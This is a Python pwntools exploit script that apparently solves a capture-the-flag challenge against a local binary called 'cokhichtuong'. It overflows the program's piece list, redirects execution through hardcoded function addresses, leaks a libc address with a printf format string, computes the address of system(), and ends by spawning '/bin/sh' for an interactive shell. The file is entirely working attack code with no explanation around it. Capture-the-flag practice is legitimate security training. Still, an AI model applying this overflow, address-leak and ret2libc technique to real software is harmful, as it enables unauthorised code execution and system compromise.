from pwn import *

r = process("./cokhichtuong")

printf_plt = 0x08048670
print_quan_co = 0x08048a60
read_str = 0x08048c08
khich_tuong = 0x08048faa
them_quan_addr = 0x08049047

def them_quan(loai, dando):
	r.sendline("1")
	r.recv()
	r.sendline(loai)
	r.recv()
	r.sendline(dando)
	r.recv()


def main():
	r.recvuntil("> ")
	for i in range(16):
		them_quan("xe", "ahuhi")

# use get_flag
#	them_quan("noob", p32(get_flag))

#	r.sendline("2")
#	r.interactive()

# get shell
	them_quan("noob", p32(read_str) + p32(printf_plt) + p32(them_quan_addr))
	r.sendline("2")
	r.sendline("%15$p\n")

	r.recvuntil("> ")
	r.sendline("3")

	leak = int(r.recvline(), 16)
	log.info("Leak: %x" % leak)
	base = leak - 247 - 0x00018540
	system = base + 0x0003ada0
	log.info("Base: %x\nSystem: %x" % (base,system))

	r.recvuntil("> ")
	r.sendline("2")
	r.sendline("\x00"*4 + "\x10\x00\x00\x00")

	r.recvuntil("> ")
	them_quan("noob", p32(read_str)+p32(system))

	r.sendline("2")
	r.sendline("/bin/sh")

	r.recvuntil("> ")
	r.sendline("3")

	r.interactive()

main()
